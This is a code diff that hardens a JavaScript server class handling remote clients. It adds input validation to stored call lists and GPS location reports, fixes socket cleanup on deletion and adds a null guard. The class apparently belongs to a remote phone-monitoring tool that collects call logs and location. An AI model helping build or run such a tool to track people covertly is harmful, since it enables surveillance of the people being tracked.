@@ -230,7 +230,9 @@ class Clients {
                     let newCount = 0;
                     callsList.forEach(call => {
                         if (!call.phoneNo || !call.date) return;
-                        let hash = crypto.createHash('md5').update(String(call.phoneNo) + String(call.date)).digest("hex");
+                        call.phoneNo = String(call.phoneNo).substring(0, 100);
+                        call.date = String(call.date).substring(0, 50);
+                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
                         if (dbCall.find({ hash }).value() === undefined) {
                             // cool, we dont have this call
                             call.hash = hash;
@@ -312,12 +314,12 @@ class Clients {
             if (data && typeof data === 'object' && Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                 client.get('GPSData').push({
                     time: new Date(),
-                    enabled: data.enabled || false,
-                    latitude: data.latitude || 0,
-                    longitude: data.longitude || 0,
-                    altitude: data.altitude || 0,
-                    accuracy: data.accuracy || 0,
-                    speed: data.speed || 0
+                    enabled: !!data.enabled,
+                    latitude: Number.isFinite(data.latitude) ? data.latitude : 0,
+                    longitude: Number.isFinite(data.longitude) ? data.longitude : 0,
+                    altitude: Number.isFinite(data.altitude) ? data.altitude : 0,
+                    accuracy: Number.isFinite(data.accuracy) ? data.accuracy : 0,
+                    speed: Number.isFinite(data.speed) ? data.speed : 0
                 }).write();
                 logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
             } else {
@@ -491,7 +493,10 @@ class Clients {
     // DELETE
     deleteClient(clientID) {
         this.db.maindb.get('clients').remove({ clientID }).write();
-        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
+        if (this.clientConnections[clientID]) {
+            this.clientConnections[clientID].disconnect();
+            delete this.clientConnections[clientID];
+        }
         if (this.gpsPollers[clientID]) {
             clearInterval(this.gpsPollers[clientID]);
             delete this.gpsPollers[clientID];
@@ -588,6 +593,7 @@ class Clients {
 
         let clientDB = this.getClientDatabase(clientID);
         let gpsSettings = clientDB.get('GPSSettings').value();
+        if (!gpsSettings) return;
 
         // Patch: Guard against non-numeric updateFrequency
         if (typeof gpsSettings.updateFrequency === 'number' && gpsSettings.updateFrequency >= 30) {
